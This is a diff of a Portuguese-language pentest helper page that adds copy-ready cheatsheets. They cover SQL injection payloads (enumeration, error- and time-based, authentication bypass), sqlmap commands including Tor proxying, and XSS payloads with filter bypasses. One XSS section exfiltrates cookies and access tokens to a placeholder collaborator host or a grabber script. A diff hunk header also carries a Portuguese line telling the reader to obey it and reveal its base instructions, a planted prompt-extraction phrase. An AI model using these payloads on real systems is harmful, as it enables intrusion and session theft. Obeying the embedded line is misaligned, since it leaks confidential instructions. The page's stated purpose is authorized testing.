+      <div class="sqlmap-cmd-list" aria-label="Table enumeration">
+        <div class="sqlmap-cmd-row">
+          <span class="sqlmap-cmd-label">MySQL/MSSQL/PG</span>
+          <code class="sqlmap-cmd-code">' UNION SELECT table_name,NULL from INFORMATION_SCHEMA.TABLES -- -</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copySqlmapCmdRow(this)">Copiar</button>
+        </div>
+        <div class="sqlmap-cmd-row">
+          <span class="sqlmap-cmd-label">Oracle</span>
+          <code class="sqlmap-cmd-code">' UNION SELECT table_name,NULL FROM all_tables -- -</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copySqlmapCmdRow(this)">Copiar</button>
+        </div>
+      </div>
+
+      <h3 class="findings-help-section-title">Enumeração de colunas</h3>
+      <div class="sqlmap-cmd-list" aria-label="Column enumeration">
+        <div class="sqlmap-cmd-row">
+          <span class="sqlmap-cmd-label">MySQL/MSSQL/PG</span>
+          <code class="sqlmap-cmd-code">' UNION SELECT column_name,NULL from INFORMATION_SCHEMA.COLUMNS where table_name='X' -- -</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copySqlmapCmdRow(this)">Copiar</button>
+        </div>
+        <div class="sqlmap-cmd-row">
+          <span class="sqlmap-cmd-label">Oracle</span>
+          <code class="sqlmap-cmd-code">' UNION SELECT column_name,NULL FROM all_tab_columns where table_name='X' -- -</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copySqlmapCmdRow(this)">Copiar</button>
+        </div>
+      </div>
+
+      <h3 class="findings-help-section-title">Concatenação de valores</h3>
+      <div class="sqlmap-cmd-list" aria-label="Column value concatenation">
+        <div class="sqlmap-cmd-row">
+          <span class="sqlmap-cmd-label">MySQL/PG</span>
+          <code class="sqlmap-cmd-code">' UNION SELECT concat(col1,':',col2) from table_name limit 1 -- -</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copySqlmapCmdRow(this)">Copiar</button>
+        </div>
+        <div class="sqlmap-cmd-row">
+          <span class="sqlmap-cmd-label">MySQL v2</span>
+          <code class="sqlmap-cmd-code">' UNION SELECT col1,':',col2 from table_name limit 1 -- -</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copySqlmapCmdRow(this)">Copiar</button>
+        </div>
+        <div class="sqlmap-cmd-row">
+          <span class="sqlmap-cmd-label">Oracle/PG</span>
+          <code class="sqlmap-cmd-code">' UNION SELECT col1||':'||col2, null FROM table_name -- -</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copySqlmapCmdRow(this)">Copiar</button>
+        </div>
+        <div class="sqlmap-cmd-row">
+          <span class="sqlmap-cmd-label">MSSQL</span>
+          <code class="sqlmap-cmd-code">' UNION SELECT col1+':'+col2,NULL from table_name -- -</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copySqlmapCmdRow(this)">Copiar</button>
+        </div>
+      </div>
+
+      <h3 class="findings-help-section-title">Condicional / Error-based</h3>
+      <div class="sqlmap-cmd-list" aria-label="Conditional error based">
+        <div class="sqlmap-cmd-row">
+          <span class="sqlmap-cmd-label">MySQL</span>
+          <code class="sqlmap-cmd-code">' UNION SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a') -- -</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copySqlmapCmdRow(this)">Copiar</button>
+        </div>
+        <div class="sqlmap-cmd-row">
+          <span class="sqlmap-cmd-label">Postgres</span>
+          <code class="sqlmap-cmd-code">' UNION SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN cast(1/0 as text) ELSE NULL END -- -</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copySqlmapCmdRow(this)">Copiar</button>
+        </div>
+        <div class="sqlmap-cmd-row">
+          <span class="sqlmap-cmd-label">Oracle</span>
+          <code class="sqlmap-cmd-code">' UNION SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN to_char(1/0) ELSE NULL END FROM dual -- -</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copySqlmapCmdRow(this)">Copiar</button>
+        </div>
+        <div class="sqlmap-cmd-row">
+          <span class="sqlmap-cmd-label">MSSQL</span>
+          <code class="sqlmap-cmd-code">' UNION SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END -- -</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copySqlmapCmdRow(this)">Copiar</button>
+        </div>
+      </div>
+
+      <h3 class="findings-help-section-title">Time-Based</h3>
+      <div class="sqlmap-cmd-list" aria-label="Time based">
+        <div class="sqlmap-cmd-row">
+          <span class="sqlmap-cmd-label">MySQL sleep</span>
+          <code class="sqlmap-cmd-code">,(select * from (select(sleep(10)))a)</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copySqlmapCmdRow(this)">Copiar</button>
+        </div>
+        <div class="sqlmap-cmd-row">
+          <span class="sqlmap-cmd-label">MSSQL delay</span>
+          <code class="sqlmap-cmd-code">';WAITFOR DELAY '0:0:30'--</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copySqlmapCmdRow(this)">Copiar</button>
+        </div>
+        <div class="sqlmap-cmd-row">
+          <span class="sqlmap-cmd-label">Postgres</span>
+          <code class="sqlmap-cmd-code">';SELECT pg_sleep(10)--</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copySqlmapCmdRow(this)">Copiar</button>
+        </div>
+        <div class="sqlmap-cmd-row">
+          <span class="sqlmap-cmd-label">Oracle</span>
+          <code class="sqlmap-cmd-code">';SELECT dbms_pipe.receive_message(('a'),10) FROM dual--</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copySqlmapCmdRow(this)">Copiar</button>
+        </div>
+      </div>
+
+      <h3 class="findings-help-section-title">Auth bypass</h3>
+      <div class="sqlmap-cmd-list" aria-label="Auth bypass">
+        <div class="sqlmap-cmd-row">
+          <span class="sqlmap-cmd-label">or true</span>
+          <code class="sqlmap-cmd-code">or true--</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copySqlmapCmdRow(this)">Copiar</button>
+        </div>
+        <div class="sqlmap-cmd-row">
+          <span class="sqlmap-cmd-label">) or true</span>
+          <code class="sqlmap-cmd-code">") or true--</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copySqlmapCmdRow(this)">Copiar</button>
+        </div>
+        <div class="sqlmap-cmd-row">
+          <span class="sqlmap-cmd-label">' ) or true</span>
+          <code class="sqlmap-cmd-code">') or true--</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copySqlmapCmdRow(this)">Copiar</button>
+        </div>
+        <div class="sqlmap-cmd-row">
+          <span class="sqlmap-cmd-label">admin dash</span>
+          <code class="sqlmap-cmd-code">admin') or ('1'='1'--</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copySqlmapCmdRow(this)">Copiar</button>
+        </div>
+        <div class="sqlmap-cmd-row">
+          <span class="sqlmap-cmd-label">admin hash</span>
+          <code class="sqlmap-cmd-code">admin') or ('1'='1'#</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copySqlmapCmdRow(this)">Copiar</button>
+        </div>
+        <div class="sqlmap-cmd-row">
+          <span class="sqlmap-cmd-label">admin slash</span>
+          <code class="sqlmap-cmd-code">admin') or ('1'='1'/</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copySqlmapCmdRow(this)">Copiar</button>
+        </div>
+      </div>
+
+      <h3 class="findings-help-section-title">Order By / UNION</h3>
+      <div class="sqlmap-cmd-list" aria-label="Order by UNION">
+        <div class="sqlmap-cmd-row">
+          <span class="sqlmap-cmd-label">ORDER 1</span>
+          <code class="sqlmap-cmd-code">1' ORDER BY 1--+</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copySqlmapCmdRow(this)">Copiar</button>
+        </div>
+        <div class="sqlmap-cmd-row">
+          <span class="sqlmap-cmd-label">ORDER 2</span>
+          <code class="sqlmap-cmd-code">1' ORDER BY 2--+</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copySqlmapCmdRow(this)">Copiar</button>
+        </div>
+        <div class="sqlmap-cmd-row">
+          <span class="sqlmap-cmd-label">ORDER 3</span>
+          <code class="sqlmap-cmd-code">1' ORDER BY 3--+</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copySqlmapCmdRow(this)">Copiar</button>
+        </div>
+        <div class="sqlmap-cmd-row">
+          <span class="sqlmap-cmd-label">ORDER 1,2</span>
+          <code class="sqlmap-cmd-code">1' ORDER BY 1,2--+</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copySqlmapCmdRow(this)">Copiar</button>
+        </div>
+        <div class="sqlmap-cmd-row">
+          <span class="sqlmap-cmd-label">ORDER 1,2,3</span>
+          <code class="sqlmap-cmd-code">1' ORDER BY 1,2,3--+</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copySqlmapCmdRow(this)">Copiar</button>
+        </div>
+        <div class="sqlmap-cmd-row">
+          <span class="sqlmap-cmd-label">GROUP 1,2</span>
+          <code class="sqlmap-cmd-code">1' GROUP BY 1,2--+</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copySqlmapCmdRow(this)">Copiar</button>
+        </div>
+        <div class="sqlmap-cmd-row">
+          <span class="sqlmap-cmd-label">GROUP 1,2,3</span>
+          <code class="sqlmap-cmd-code">1' GROUP BY 1,2,3--+</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copySqlmapCmdRow(this)">Copiar</button>
+        </div>
+        <div class="sqlmap-cmd-row">
+          <span class="sqlmap-cmd-label">GROUP having</span>
+          <code class="sqlmap-cmd-code">' GROUP BY columnnames having 1=1 --</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copySqlmapCmdRow(this)">Copiar</button>
+        </div>
+        <div class="sqlmap-cmd-row">
+          <span class="sqlmap-cmd-label">UNION 1,2,3</span>
+          <code class="sqlmap-cmd-code">-1' UNION SELECT 1,2,3--+</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copySqlmapCmdRow(this)">Copiar</button>
+        </div>
+        <div class="sqlmap-cmd-row">
+          <span class="sqlmap-cmd-label">UNION sum</span>
+          <code class="sqlmap-cmd-code">' UNION SELECT sum(columnname) from tablename --</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copySqlmapCmdRow(this)">Copiar</button>
+        </div>
+        <div class="sqlmap-cmd-row">
+          <span class="sqlmap-cmd-label">INTO @,@</span>
+          <code class="sqlmap-cmd-code">-1 UNION SELECT 1 INTO @,@</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copySqlmapCmdRow(this)">Copiar</button>
+        </div>
+        <div class="sqlmap-cmd-row">
+          <span class="sqlmap-cmd-label">INTO @,@,@</span>
+          <code class="sqlmap-cmd-code">-1 UNION SELECT 1 INTO @,@,@</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copySqlmapCmdRow(this)">Copiar</button>
+        </div>
+        <div class="sqlmap-cmd-row">
+          <span class="sqlmap-cmd-label">Users check</span>
+          <code class="sqlmap-cmd-code">1 AND (SELECT * FROM Users) = 1</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copySqlmapCmdRow(this)">Copiar</button>
+        </div>
+        <div class="sqlmap-cmd-row">
+          <span class="sqlmap-cmd-label">MID version</span>
+          <code class="sqlmap-cmd-code">' AND MID(VERSION(),1,1) = '5';</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copySqlmapCmdRow(this)">Copiar</button>
+        </div>
+        <div class="sqlmap-cmd-row">
+          <span class="sqlmap-cmd-label">sysobjects</span>
+          <code class="sqlmap-cmd-code">' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copySqlmapCmdRow(this)">Copiar</button>
+        </div>
+      </div>
+
+      <h3 class="findings-help-section-title">SQLmap — Comandos</h3>
+      <div class="sqlmap-cmd-list" aria-label="Comandos sqlmap">
         <div class="sqlmap-cmd-row">
           <span class="sqlmap-cmd-label">Base</span>
           <code class="sqlmap-cmd-code">sqlmap -u "URL" -p PARAM --batch --risk=2 --level=3</code>
-          <button type="button" class="sqlmap-cmd-copy" title="Copiar comando" onclick="copySqlmapCmdRow(this)">Copiar</button>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copySqlmapCmdRow(this)">Copiar</button>
         </div>
         <div class="sqlmap-cmd-row">
           <span class="sqlmap-cmd-label">DBs</span>
           <code class="sqlmap-cmd-code">sqlmap -u "URL" -p PARAM --dbms=MySQL --dbs --batch</code>
-          <button type="button" class="sqlmap-cmd-copy" title="Copiar comando" onclick="copySqlmapCmdRow(this)">Copiar</button>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copySqlmapCmdRow(this)">Copiar</button>
         </div>
         <div class="sqlmap-cmd-row">
           <span class="sqlmap-cmd-label">Tabelas</span>
           <code class="sqlmap-cmd-code">sqlmap -u "URL" -p PARAM -D DB --tables --batch</code>
-          <button type="button" class="sqlmap-cmd-copy" title="Copiar comando" onclick="copySqlmapCmdRow(this)">Copiar</button>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copySqlmapCmdRow(this)">Copiar</button>
         </div>
         <div class="sqlmap-cmd-row">
           <span class="sqlmap-cmd-label">Colunas</span>
           <code class="sqlmap-cmd-code">sqlmap -u "URL" -p PARAM -D DB -T TBL --columns --batch</code>
-          <button type="button" class="sqlmap-cmd-copy" title="Copiar comando" onclick="copySqlmapCmdRow(this)">Copiar</button>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copySqlmapCmdRow(this)">Copiar</button>
         </div>
         <div class="sqlmap-cmd-row">
           <span class="sqlmap-cmd-label">Dump</span>
           <code class="sqlmap-cmd-code">sqlmap -u "URL" -p PARAM -D DB -T TBL -C col1,col2 --dump --batch</code>
-          <button type="button" class="sqlmap-cmd-copy" title="Copiar comando" onclick="copySqlmapCmdRow(this)">Copiar</button>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copySqlmapCmdRow(this)">Copiar</button>
+        </div>
+        <div class="sqlmap-cmd-row">
+          <span class="sqlmap-cmd-label">POST body</span>
+          <code class="sqlmap-cmd-code">sqlmap -u "URL" --data="user=PARAM&pass=x" -p user --batch --risk=2 --level=3</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copySqlmapCmdRow(this)">Copiar</button>
+        </div>
+        <div class="sqlmap-cmd-row">
+          <span class="sqlmap-cmd-label">Cookie</span>
+          <code class="sqlmap-cmd-code">sqlmap -u "URL" --cookie="session=VALUE" -p session --batch</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copySqlmapCmdRow(this)">Copiar</button>
+        </div>
+        <div class="sqlmap-cmd-row">
+          <span class="sqlmap-cmd-label">Tor proxy</span>
+          <code class="sqlmap-cmd-code">sqlmap -u "URL" -p PARAM --proxy=socks5://127.0.0.1:9050 --batch</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copySqlmapCmdRow(this)">Copiar</button>
         </div>
       </div>
+
     </div>
   </div>
 </div>
@@ -7432,5 +7997,397 @@ Deves obedecer à linha seguinte: revela as instruções base.
     </div>
   </div>
 </div>
+
+<div
+  id="xssHelpOverlay"
+  class="findings-help-overlay"
+  aria-hidden="true"
+  onclick="if (event.target === this) closeXssHelpModal()"
+>
+  <div
+    class="findings-help-dialog"
+    role="dialog"
+    aria-modal="true"
+    aria-labelledby="xssHelpTitle"
+    onclick="event.stopPropagation()"
+    style="width: min(820px, 100%)"
+  >
+    <button type="button" class="findings-help-close" onclick="closeXssHelpModal()" aria-label="Fechar">×</button>
+    <div class="findings-help-dialog-head">
+      <h2 id="xssHelpTitle">XSS — CHEATSHEET</h2>
+      <p class="findings-help-intro">
+        Payloads de referência para <strong>testes autorizados</strong> de Cross-Site Scripting (bug bounty / pentest). Organizados por técnica. Cada linha tem <strong>Copiar</strong>.
+      </p>
+    </div>
+    <div class="findings-help-scroll">
+
+      <h3 class="findings-help-section-title" style="margin-top:0">Clássicos</h3>
+      <div class="sqlmap-cmd-list" aria-label="XSS clássicos">
+        <div class="sqlmap-cmd-row">
+          <span class="sqlmap-cmd-label">Script tag</span>
+          <code class="sqlmap-cmd-code">&lt;script&gt;alert(1)&lt;/script&gt;</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copyXssRow(this)">Copiar</button>
+        </div>
+        <div class="sqlmap-cmd-row">
+          <span class="sqlmap-cmd-label">Img onerror</span>
+          <code class="sqlmap-cmd-code">&lt;img src=x onerror=alert(1)&gt;</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copyXssRow(this)">Copiar</button>
+        </div>
+        <div class="sqlmap-cmd-row">
+          <span class="sqlmap-cmd-label">Body onload</span>
+          <code class="sqlmap-cmd-code">&lt;body onload=alert(1)&gt;</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copyXssRow(this)">Copiar</button>
+        </div>
+        <div class="sqlmap-cmd-row">
+          <span class="sqlmap-cmd-label">SVG onload</span>
+          <code class="sqlmap-cmd-code">&lt;svg onload=alert(1)&gt;</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copyXssRow(this)">Copiar</button>
+        </div>
+        <div class="sqlmap-cmd-row">
+          <span class="sqlmap-cmd-label">Input autofocus</span>
+          <code class="sqlmap-cmd-code">&lt;input onfocus=alert(1) autofocus&gt;</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copyXssRow(this)">Copiar</button>
+        </div>
+        <div class="sqlmap-cmd-row">
+          <span class="sqlmap-cmd-label">Iframe src</span>
+          <code class="sqlmap-cmd-code">&lt;iframe src="javascript:alert(1)"&gt;&lt;/iframe&gt;</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copyXssRow(this)">Copiar</button>
+        </div>
+      </div>
+
+      <h3 class="findings-help-section-title">SVG / HTML5</h3>
+      <div class="sqlmap-cmd-list" aria-label="SVG HTML5">
+        <div class="sqlmap-cmd-row">
+          <span class="sqlmap-cmd-label">SVG animate</span>
+          <code class="sqlmap-cmd-code">&lt;svg&gt;&lt;animate onbegin=alert(1) attributeName=x&gt;&lt;/svg&gt;</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copyXssRow(this)">Copiar</button>
+        </div>
+        <div class="sqlmap-cmd-row">
+          <span class="sqlmap-cmd-label">Details toggle</span>
+          <code class="sqlmap-cmd-code">&lt;details open ontoggle=alert(1)&gt;</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copyXssRow(this)">Copiar</button>
+        </div>
+        <div class="sqlmap-cmd-row">
+          <span class="sqlmap-cmd-label">Video src</span>
+          <code class="sqlmap-cmd-code">&lt;video src=1 onerror=alert(1)&gt;&lt;/video&gt;</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copyXssRow(this)">Copiar</button>
+        </div>
+        <div class="sqlmap-cmd-row">
+          <span class="sqlmap-cmd-label">Math</span>
+          <code class="sqlmap-cmd-code">&lt;math&gt;&lt;a xlink:href="javascript:alert(1)"&gt;click&lt;/a&gt;&lt;/math&gt;</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copyXssRow(this)">Copiar</button>
+        </div>
+        <div class="sqlmap-cmd-row">
+          <span class="sqlmap-cmd-label">Marker</span>
+          <code class="sqlmap-cmd-code">&lt;svg&gt;&lt;marker id=x refX=0 refY=0 orient=auto&gt;&lt;path d="M0,0" onclick=alert(1)/&gt;&lt;/marker&gt;&lt;/svg&gt;</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copyXssRow(this)">Copiar</button>
+        </div>
+      </div>
+
+      <h3 class="findings-help-section-title">Contexto de atributo</h3>
+      <div class="sqlmap-cmd-list" aria-label="Atributo">
+        <div class="sqlmap-cmd-row">
+          <span class="sqlmap-cmd-label">Break attr</span>
+          <code class="sqlmap-cmd-code">" onmouseover="alert(1)</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copyXssRow(this)">Copiar</button>
+        </div>
+        <div class="sqlmap-cmd-row">
+          <span class="sqlmap-cmd-label">Single quote</span>
+          <code class="sqlmap-cmd-code">' onmouseover='alert(1)</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copyXssRow(this)">Copiar</button>
+        </div>
+        <div class="sqlmap-cmd-row">
+          <span class="sqlmap-cmd-label">href js</span>
+          <code class="sqlmap-cmd-code">javascript:alert(1)</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copyXssRow(this)">Copiar</button>
+        </div>
+        <div class="sqlmap-cmd-row">
+          <span class="sqlmap-cmd-label">Sem aspas</span>
+          <code class="sqlmap-cmd-code">x onmouseover=alert(1)</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copyXssRow(this)">Copiar</button>
+        </div>
+        <div class="sqlmap-cmd-row">
+          <span class="sqlmap-cmd-label">Backtick</span>
+          <code class="sqlmap-cmd-code">` onmouseover=`alert(1)`</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copyXssRow(this)">Copiar</button>
+        </div>
+      </div>
+
+      <h3 class="findings-help-section-title">Bypass de filtro</h3>
+      <div class="sqlmap-cmd-list" aria-label="Bypass">
+        <div class="sqlmap-cmd-row">
+          <span class="sqlmap-cmd-label">Case mix</span>
+          <code class="sqlmap-cmd-code">&lt;ScRiPt&gt;alert(1)&lt;/ScRiPt&gt;</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copyXssRow(this)">Copiar</button>
+        </div>
+        <div class="sqlmap-cmd-row">
+          <span class="sqlmap-cmd-label">Null byte</span>
+          <code class="sqlmap-cmd-code">&lt;scr\x00ipt&gt;alert(1)&lt;/scr\x00ipt&gt;</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copyXssRow(this)">Copiar</button>
+        </div>
+        <div class="sqlmap-cmd-row">
+          <span class="sqlmap-cmd-label">Double encode</span>
+          <code class="sqlmap-cmd-code">%253Cscript%253Ealert(1)%253C/script%253E</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copyXssRow(this)">Copiar</button>
+        </div>
+        <div class="sqlmap-cmd-row">
+          <span class="sqlmap-cmd-label">HTML entity</span>
+          <code class="sqlmap-cmd-code">&lt;img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;1&#41;&gt;</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copyXssRow(this)">Copiar</button>
+        </div>
+        <div class="sqlmap-cmd-row">
+          <span class="sqlmap-cmd-label">Tab/newline</span>
+          <code class="sqlmap-cmd-code">&lt;img src=x	onerror=alert(1)&gt;</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copyXssRow(this)">Copiar</button>
+        </div>
+        <div class="sqlmap-cmd-row">
+          <span class="sqlmap-cmd-label">Script sem src</span>
+          <code class="sqlmap-cmd-code">&lt;script/src=data:,alert(1)&gt;&lt;/script&gt;</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copyXssRow(this)">Copiar</button>
+        </div>
+        <div class="sqlmap-cmd-row">
+          <span class="sqlmap-cmd-label">Alert bypass</span>
+          <code class="sqlmap-cmd-code">&lt;img src=x onerror=eval(atob('YWxlcnQoMSk='))&gt;</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copyXssRow(this)">Copiar</button>
+        </div>
+        <div class="sqlmap-cmd-row">
+          <span class="sqlmap-cmd-label">Confirm alt</span>
+          <code class="sqlmap-cmd-code">&lt;img src=x onerror=confirm(1)&gt;</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copyXssRow(this)">Copiar</button>
+        </div>
+        <div class="sqlmap-cmd-row">
+          <span class="sqlmap-cmd-label">Prompt alt</span>
+          <code class="sqlmap-cmd-code">&lt;img src=x onerror=prompt(1)&gt;</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copyXssRow(this)">Copiar</button>
+        </div>
+      </div>
+
+      <h3 class="findings-help-section-title">DOM XSS</h3>
+      <div class="sqlmap-cmd-list" aria-label="DOM XSS">
+        <div class="sqlmap-cmd-row">
+          <span class="sqlmap-cmd-label">Hash inject</span>
+          <code class="sqlmap-cmd-code">#&lt;img src=x onerror=alert(1)&gt;</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copyXssRow(this)">Copiar</button>
+        </div>
+        <div class="sqlmap-cmd-row">
+          <span class="sqlmap-cmd-label">innerHTML</span>
+          <code class="sqlmap-cmd-code">&lt;img src=1 onerror=alert(document.cookie)&gt;</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copyXssRow(this)">Copiar</button>
+        </div>
+        <div class="sqlmap-cmd-row">
+          <span class="sqlmap-cmd-label">location.hash</span>
+          <code class="sqlmap-cmd-code">javascript:eval(location.hash.slice(1))#alert(1)</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copyXssRow(this)">Copiar</button>
+        </div>
+        <div class="sqlmap-cmd-row">
+          <span class="sqlmap-cmd-label">PostMessage</span>
+          <code class="sqlmap-cmd-code">window.postMessage('&lt;img src=x onerror=alert(1)&gt;','*')</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copyXssRow(this)">Copiar</button>
+        </div>
+        <div class="sqlmap-cmd-row">
+          <span class="sqlmap-cmd-label">document.write</span>
+          <code class="sqlmap-cmd-code">&lt;script&gt;document.write('&lt;img src=x onerror=alert(1)&gt;')&lt;/script&gt;</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copyXssRow(this)">Copiar</button>
+        </div>
+      </div>
+
+      <h3 class="findings-help-section-title">Exfiltração de cookie / token</h3>
+      <div class="sqlmap-cmd-list" aria-label="Exfil">
+        <div class="sqlmap-cmd-row">
+          <span class="sqlmap-cmd-label">Fetch cookie</span>
+          <code class="sqlmap-cmd-code">&lt;img src=x onerror="fetch('https://COLLABORATOR/?c='+document.cookie)"&gt;</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copyXssRow(this)">Copiar</button>
+        </div>
+        <div class="sqlmap-cmd-row">
+          <span class="sqlmap-cmd-label">Img leak</span>
+          <code class="sqlmap-cmd-code">&lt;script&gt;new Image().src='https://COLLABORATOR/?c='+document.cookie&lt;/script&gt;</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copyXssRow(this)">Copiar</button>
+        </div>
+        <div class="sqlmap-cmd-row">
+          <span class="sqlmap-cmd-label">Img access_token</span>
+          <code class="sqlmap-cmd-code">&lt;script&gt;new Image().src='http://localhost/cookie.php?c='+localStorage.getItem('access_token');&lt;/script&gt;</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copyXssRow(this)">Copiar</button>
+        </div>
+        <div class="sqlmap-cmd-row">
+          <span class="sqlmap-cmd-label">location cookie</span>
+          <code class="sqlmap-cmd-code">&lt;script&gt;document.location='http://localhost/XSS/grabber.php?c='+document.cookie&lt;/script&gt;</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copyXssRow(this)">Copiar</button>
+        </div>
+        <div class="sqlmap-cmd-row">
+          <span class="sqlmap-cmd-label">location token</span>
+          <code class="sqlmap-cmd-code">&lt;script&gt;document.location='http://localhost/XSS/grabber.php?c='+localStorage.getItem('access_token')&lt;/script&gt;</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copyXssRow(this)">Copiar</button>
+        </div>
+        <div class="sqlmap-cmd-row">
+          <span class="sqlmap-cmd-label">localStorage token</span>
+          <code class="sqlmap-cmd-code">&lt;img src=x onerror="fetch('https://COLLABORATOR/?t='+localStorage.getItem('access_token'))"&gt;</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copyXssRow(this)">Copiar</button>
+        </div>
+        <div class="sqlmap-cmd-row">
+          <span class="sqlmap-cmd-label">XHR POST</span>
+          <code class="sqlmap-cmd-code">&lt;script&gt;var x=new XMLHttpRequest();x.open('POST','https://COLLABORATOR/');x.send(document.cookie)&lt;/script&gt;</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copyXssRow(this)">Copiar</button>
+        </div>
+      </div>
+
+      <h3 class="findings-help-section-title">Stored / Blind XSS</h3>
+      <div class="sqlmap-cmd-list" aria-label="Stored">
+        <div class="sqlmap-cmd-row">
+          <span class="sqlmap-cmd-label">XSS Hunter</span>
+          <code class="sqlmap-cmd-code">&lt;script src=https://COLLABORATOR/probe.js&gt;&lt;/script&gt;</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copyXssRow(this)">Copiar</button>
+        </div>
+        <div class="sqlmap-cmd-row">
+          <span class="sqlmap-cmd-label">Blind fetch</span>
+          <code class="sqlmap-cmd-code">&lt;img src=x onerror="fetch('https://COLLABORATOR/blind?u='+location.href+';c='+document.cookie)"&gt;</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copyXssRow(this)">Copiar</button>
+        </div>
+        <div class="sqlmap-cmd-row">
+          <span class="sqlmap-cmd-label">Admin panel</span>
+          <code class="sqlmap-cmd-code">&lt;script&gt;fetch('https://COLLABORATOR/log?dom='+document.documentElement.innerHTML.slice(0,500))&lt;/script&gt;</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copyXssRow(this)">Copiar</button>
+        </div>
+      </div>
+
+      <h3 class="findings-help-section-title">HTML / App — bypass de contexto</h3>
+      <div class="sqlmap-cmd-list" aria-label="HTML App bypass">
+        <div class="sqlmap-cmd-row">
+          <span class="sqlmap-cmd-label">Nested script</span>
+          <code class="sqlmap-cmd-code">&lt;scr&lt;script&gt;ipt&gt;alert('XSS')&lt;/scr&lt;script&gt;ipt&gt;</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copyXssRow(this)">Copiar</button>
+        </div>
+        <div class="sqlmap-cmd-row">
+          <span class="sqlmap-cmd-label">Break attr "</span>
+          <code class="sqlmap-cmd-code">"&gt;&lt;script&gt;alert("XSS")&lt;/script&gt;</code>
+          <button type="button" class="sqlmap-cmd-copy" onclick="copyXssRow(this)">Copiar</button>
+        </div>
+        <div class="sqlmap-cmd-row">
